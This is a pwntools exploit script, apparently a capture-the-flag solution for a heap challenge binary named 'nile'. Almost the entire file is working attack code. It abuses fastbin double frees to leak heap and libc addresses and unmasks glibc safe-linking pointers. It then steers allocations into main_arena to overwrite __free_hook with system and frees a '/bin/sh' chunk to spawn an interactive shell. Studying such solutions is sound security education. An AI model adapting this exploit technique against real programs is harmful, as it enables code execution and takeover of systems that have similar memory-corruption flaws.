#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntools-pwn template nile --host localhost --port 4444
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('nile')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 4444)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def pad(data, size):
    if isinstance(data, str): data = data.encode()
    assert len(data) < size
    return data

nallocs = 0
nfrees = 0
current_idx = 0
def alloc_tiny(data=""):
    global current_idx, nallocs
    nallocs += 1

    data = pad(data, 0x20)

    res = current_idx
    current_idx += 1

    io.recvuntil("> ")
    io.sendline("1")
    io.recvuntil("> ")
    io.sendline(str(len(data)))
    io.send(data)
    
    return res

def alloc_small(data=""):
    global current_idx, nallocs
    nallocs += 1

    data = pad(data, 0x40)

    res = current_idx
    current_idx += 1

    io.recvuntil("> ")
    io.sendline("2")
    io.recvuntil("> ")
    io.sendline(str(len(data)))
    io.send(data)
    
    return res

def alloc_big():
    io.recvuntil("> ")
    io.sendline("5")

def free(idx):
    global nfrees
    nfrees += 1
    io.recvuntil("> ")
    io.sendline("4")
    io.recvuntil("> ")
    io.sendline(str(idx))

def review():
    io.recvuntil("> ")
    io.sendline("3")
    io.recvuntil("NSA")
    io.recvline()
    return io.recvuntil("I hope that's helpful to you.").splitlines()[:-1]

def nibbles(x):
    return [int(y, 16) for y in hex(x)[2:].zfill(16)]

def unmask(leak):
    L = nibbles(leak)
    C = [0 for _ in range(16)]
    for i in range(16):
        x = 0 if i < 3 else C[i - 3]
        C[i] = L[i] ^ x
    return int(''.join(hex(x)[2:] for x in C), 16)

# libc = ELF("/usr/lib/libc.so.6")
libc = ELF("./libc-2.32.so")

io = start()

# Fill the tcaches
for _ in range(7):
    free(alloc_small())


# Double free in the 0x50 fastbin for heap leak, then dup to smallbins for libc leak
a1 = alloc_small()
b = alloc_small()
free(a1);
free(b);
free(a1);
info("Heap leak double free ready")

# Heap leak time: get a live reference, and free the already dead one again to overwrite the content we can read
a2 = alloc_small()
free(a1);
info("Heap leak:")
info(str(review()))
masked_heap_leak = unpack(review()[-1].ljust(8, b'\0'))
info(f"{hex(masked_heap_leak) = }")
heap_leak = unmask(masked_heap_leak)
info(f"{hex(heap_leak) = }")
safe_link_leak = heap_leak >> 12
info(f"{hex(safe_link_leak) = }")

# libc leak time: keep the live reference (or get the same one again from the fastbin, it has to go anyway), and move a single item to smallbins
a2 = alloc_small(pack(safe_link_leak)) # Restore the fd pointer of our chunk to go into the smallbin
b = alloc_small() # Remove this from the fastbin again
alloc_big()
current_idx = max(current_idx - 10, 0)
info(f"Number of allocs so far: {nallocs}")
info("We now have a chunk in the smallbin")
main_arena = unpack(review()[0].ljust(8, b'\0')) - 0xa0
info(f"{hex(main_arena) = }")
libc.address = main_arena - libc.sym['main_arena']
alloc_small()
binsh = alloc_small("/bin/sh") # Clear the smallbin

for _ in range(7):
    free(alloc_tiny())

# Now we prepare a landing pad in main_arena so that we can get a pointer there out of the fastbins
t1 = alloc_tiny()
t2 = alloc_tiny()
free(t1)
free(t2)
free(t1)
info("Double free in the 0x30 fastbins")
t1 = alloc_tiny(pack((safe_link_leak + 1) ^ 0x53)) # 0x53 as size field for a fake 0x50 chunk, adjust safe link leak by one because alloc_big brings us on the next page, also set as malloced because otherwise we segfault when calloc clears the wilderness pointer, even though we can't overwrite it yet
t2 = alloc_tiny()
alloc_tiny()
info("landing pad ready")

# Now we redirect the 0x50 fastbin to a place in main_arena, so that we can overflow into the wilderness pointer
a1 = alloc_small()
a3 = alloc_small()
free(a1)
free(a3)
free(a1)
a1 = alloc_small(pack((safe_link_leak + 1) ^ (libc.sym['main_arena'] + 0x10)))
info("fake fastbin fd pointer set")
a1 = alloc_small()
a2 = alloc_small()
info("getting pointer to the arena from fastbin")
# We can't quite reach the top pointer from here, so we make a new landing pad and prepare the fastbin pointer at the same time
arena1 = alloc_small(pack(0) + pack(libc.sym['main_arena'] + 0x30) + pack(0) + pack(0x53) + pack((libc.sym['main_arena'] + 0x30) >> 12)) # add a masked 0 fd pointer
info("getting the second pointer into the arena")
arena2 = alloc_small(pack(0) * 4 + pack(libc.sym['initial'] + 16 + 6))
info(f"pointer at {hex(libc.sym['__free_hook'] - libc.sym['initial'] - 16 - 6)} above __free_hook in place as wilderness")
offset = libc.sym['__free_hook'] - libc.sym['initial'] - 16 - 6
while offset >= 0x50:
    alloc_small()
    offset -= 0x50
info("Bridged the gap")

# Now the gap is badly aligned, so we need two tiny chunks instead, so we first need to clean that fastbin
free(t1)
free(t2)
free(t1)
alloc_tiny(pack(safe_link_leak + 1))
alloc_tiny()
alloc_tiny()
info("cleaned 0x30 fastbin")

alloc_tiny()
alloc_tiny(b"\0" * 2 + pack(0) + pack(libc.sym['system']))
info("Overwrote __free_hook, now freeing the /bin/sh chunk")
free(binsh)
info(f"Needed {nallocs + 1} call to calloc and {nfrees} calls to free")

io.interactive()

